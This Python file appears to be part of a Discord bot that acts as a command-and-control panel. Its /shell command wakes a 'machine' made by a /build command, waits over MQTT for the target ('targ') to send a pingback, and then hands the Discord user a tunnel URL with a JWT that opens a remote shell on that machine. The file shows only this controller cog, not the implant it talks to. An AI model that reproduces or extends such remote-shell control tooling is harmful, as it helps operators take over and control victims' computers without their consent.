import asyncio

import discord
from discord import app_commands
from discord.ext import commands

import asyncio

import builder
import machines
import mqtt


class ShellCog(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@app_commands.command(name="shell", description="poke a machine for remote shell")
	@app_commands.describe(alias="machine name from /build")
	async def shell(self, interaction, alias: str):
		m = machines.get(alias, interaction.user.id)
		if not m:
			await interaction.response.send_message("unknown machine", ephemeral=True)
			return

		url = getattr(self.bot, "tunnel_url", None)
		if not url:
			await interaction.response.send_message("bot is still starting up", ephemeral=True)
			return

		await interaction.response.defer(ephemeral=True, thinking=True)
		msg = await interaction.followup.send(f"caching keys, wait")

		ok = await machines.wake(m["mid"])
		machines.session(alias)
		await interaction.followup.edit_message(msg.id,
			content=f"caching {ok}/{machines.WAKE_KEYS} keys\n"
				f"now polling for a-key from targ, wait\n"
				f"got next targ handshake")

		async def wait_shell():
			loop = asyncio.get_event_loop()
			try:
				s = await loop.run_in_executor(None,
					lambda: mqtt.Session(m["mid"], m.get("pub")))
			except OSError as e:
				await interaction.followup.edit_message(msg.id,
					content=f"caching {ok}/{machines.WAKE_KEYS} keys\n"
						f"targ never connected check logs")
				return
			s.close()

			await interaction.followup.edit_message(msg.id,
				content=f"caching {ok}/{machines.WAKE_KEYS} keys\n"
					f"got a pingback, loading a shell\n"
					f"{url}/s?mname={alias}&t={builder.jwtshellgen(m['mid'], alias, interaction.user.id, m.get('pub'))}")

		asyncio.create_task(wait_shell())


async def setup(bot):
	await bot.add_cog(ShellCog(bot))
